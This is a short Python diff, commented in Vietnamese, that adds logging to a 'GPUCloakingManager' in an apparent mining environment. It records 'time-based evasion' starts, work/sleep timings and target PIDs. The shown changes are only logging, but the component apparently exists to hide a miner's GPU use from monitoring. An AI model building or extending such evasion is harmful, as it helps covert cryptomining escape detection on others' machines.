@@ -55,6 +55,20 @@ except ImportError:  # pragma: no cover
     def log_gpu_feature(*_args, **_kwargs):  # type: ignore
         pass
 
+# Import GPU cloaking logger
+try:
+    from ...logging.gpu_cloaking_logger import gpu_cloak_logger, log_gpu_cloaking
+except ImportError:
+    # Fallback nếu không có logger
+    class DummyLogger:
+        def log_time_based_evasion(self, *args, **kwargs): pass
+        def log_ebpf_filter(self, *args, **kwargs): pass
+    gpu_cloak_logger = DummyLogger()
+    def log_gpu_cloaking(*args, **kwargs):
+        def decorator(func):
+            return func
+        return decorator
+
 # ---------- logging ----------
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
@@ -353,9 +367,22 @@ class GPUCloakingManager:
         """Khởi động GPU Cloaking Manager với tất cả các chiến lược."""
         if self._thread and self._thread.is_alive():
             logger.warning("GPUCloakingManager đã chạy từ trước.")
+            gpu_cloak_logger.log_time_based_evasion(
+                action="START",
+                status="SUCCESS",
+                target_pid=self.pid,
+                error_details="Already running"
+            )
             return
         
         logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
+        gpu_cloak_logger.log_time_based_evasion(
+            action="START",
+            status="SUCCESS",
+            work_ms=self.work_ms,
+            sleep_ms=self.sleep_ms,
+            target_pid=self.pid
+        )
         self._thread = threading.Thread(target=self._duty_cycle_loop, daemon=True)
         self._thread.start()
 
